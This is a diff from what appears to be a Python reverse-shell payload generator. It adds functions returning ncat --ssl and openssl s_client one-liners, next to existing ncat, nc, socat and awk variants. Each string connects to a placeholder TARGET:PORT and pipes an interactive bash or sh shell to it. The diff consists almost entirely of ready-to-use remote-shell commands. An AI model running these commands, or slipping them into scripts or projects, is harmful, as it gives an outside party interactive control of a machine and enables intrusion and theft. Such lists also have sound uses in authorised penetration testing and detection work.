@@ -47,6 +47,10 @@ def REVERSE_NCAT():
     return "ncat TARGET PORT -e /bin/bash"
 
 
+def REVERSE_NCAT_SSL():
+    return "ncat TARGET PORT --ssl -e /bin/bash"
+
+
 def REVERSE_NC_TRADITIONAL_1():
     return "nc TARGET PORT -c /bin/bash"
 
@@ -73,6 +77,10 @@ def REVERSE_MKNOD_TELNET():
 
 def REVERSE_SOCAT():
     return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
+
+
+def REVERSE_OPENSSL():
+    return "mkfifo /tmp/VAR1; /bin/sh -i < /tmp/VAR1 2>&1 | openssl s_client -quiet -connect TARGET:PORT > /tmp/VAR1; rm /tmp/VAR1"
 
 
 def REVERSE_AWK():
